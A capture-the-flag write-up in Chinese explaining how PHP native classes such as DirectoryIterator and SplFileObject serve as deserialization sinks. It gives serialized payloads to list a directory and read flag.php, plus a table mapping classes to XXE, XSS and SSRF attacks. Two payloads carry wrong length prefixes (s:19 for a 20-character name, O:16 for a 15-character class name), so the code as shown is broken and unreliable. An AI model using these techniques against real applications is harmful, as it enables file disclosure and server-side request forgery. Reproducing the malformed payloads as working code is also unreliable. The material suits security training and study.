# WriteUP · Level 24 · 原生类利用

## 原理

没有 eval / system 时,PHP 的原生类可以充当 sink:

- `DirectoryIterator` —— 遍历目录,列文件名;
- `SplFileObject` —— 按行读取文件内容。

两者都通过 `__toString` 在页面 `echo` 时被触发。

## 第一步:列目录

```
o=O:7:"TJ_ITER":1:{s:19:"probiusofficial_path";s:1:".";}
```

输出当前目录文件列表,发现 `flag.php`。

## 第二步:读文件

```
o=O:16:"HELLOCTF_READER":1:{s:7:"tj_file";s:8:"flag.php";}
```

读出 flag.php 内容(动态容器中 flag 位于 /flag,相应改为 /flag)。


## 更多可用原生类(清单)

| 原生类 | 能力 | 典型用法 |
| --- | --- | --- |
| `DirectoryIterator` / `FilesystemIterator` | 遍历目录 | 列目录找敏感文件 |
| `GlobIterator` | 按模式匹配枚举 | `flag*` 通配定位(如 `GlobIterator("/flag*")`) |
| `SplFileObject` / `SplFileInfo` | 按行读文件 / 文件元信息 | 读源码、读 flag |
| `SimpleXMLElement` | 解析 XML(simplexml 扩展,默认启用) | XXE / 读 XML 数据 |
| `Error` / `Exception` | 自带 `__toString`,消息可控 | PHP7+ XSS 载体(见 Level 25) |
| `SoapClient` | 调用不存在方法触发 `__call` 发 HTTP 请求(需 soap 扩展) | SSRF,配合 CRLF 注入(见 Level 25 题解) |
| `ReflectionClass` | 反射类信息 / `newInstanceArgs` | 配合可控类名与参数实例化 |
| `ArrayObject` / `SplObjectStorage` 等 SPL 容器 | 可作为序列化载体的"包装类" | 补链时的属性载体 |

选择思路:源码没有可用的危险函数/魔术方法时,先看 sink 接受什么类型
(字符串 → Error/Exception/SplFileObject,可调用 → 找 `__call`/`__invoke`,可遍历 → 迭代器类)。
